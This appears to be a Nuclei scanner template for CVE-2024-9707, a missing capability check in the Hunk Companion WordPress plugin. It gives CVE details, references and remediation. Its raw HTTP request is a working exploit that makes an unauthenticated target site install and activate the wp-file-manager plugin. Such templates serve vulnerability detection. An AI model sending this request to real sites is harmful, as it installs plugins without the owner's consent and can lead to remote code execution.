http:
- matchers:
  - part: body
    type: word
    words:
    - '"\"https:\\\/\\\/'
  - part: content_type
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-json/hc/v1/themehunk-import HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"params": {"templateType": "free", "plugin": {"wp-file-manager": "Wp File Manager"},
    "allPlugins": [{"wp-file-manager": "wp-file-manager/wp-file-manager.php"}], "builder":
    "gogo", "themeSlug": "gogo", "proThemePlugin": "wp-file-manager", "tmplFreePro":
    "plugin", "wpUrl": "https://downloads.wordpress.org/", "thUrl": "https://themehunk.com/wp/data/"}}

    '
id: CVE-2024-9707
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:themehunk:hunk_companion:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2024-9707
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-862
    epss-percentile: 0.99528
    epss-score: 0.89458
  description: 'The Hunk Companion plugin for WordPress is vulnerable to unauthorized
    plugin installation/activation due to a missing capability check on the /wp-json/hc/v1/themehunk-import
    REST API endpoint in all versions up to, and including, 1.8.4. This makes it possible
    for unauthenticated attackers to install and activate arbitrary plugins which
    can be leveraged to achieve remote code execution if another vulnerable plugin
    is installed and activated.

    '
  impact: 'Unauthenticated attackers can install and activate arbitrary WordPress
    plugins, potentially achieving remote code execution if a vulnerable plugin is
    installed and activated on the target site.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/hunk-companion/"
    framework: wordpress
    max-request: 1
    product: hunk_companion
    vendor: themehunk
    verified: true
  name: Hunk Companion <= 1.8.4 - Arbitrary Plugin Installation
  reference:
  - https://wordpress.org/plugins/hunk-companion/
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/9c101fca-037c-4bed-9dc7-baa021a8b59c?source=cve
  - https://github.com/iSee857/CVE-PoC/blob/main/WordPress_Hunk_Companion(CVE-2024-9707).py
  - https://github.com/RandomRobbieBF/CVE-2024-9707
  - https://nvd.nist.gov/vuln/detail/CVE-2024-9707
  remediation: 'Update Hunk Companion plugin to a version later than 1.8.4 that implements
    proper capability checks on the /wp-json/hc/v1/themehunk-import REST API endpoint.

    '
  severity: critical
  tags: cve,cve2024,wp,wp-plugin,wordpress,hunk-companion,intrusive,vkev,vuln
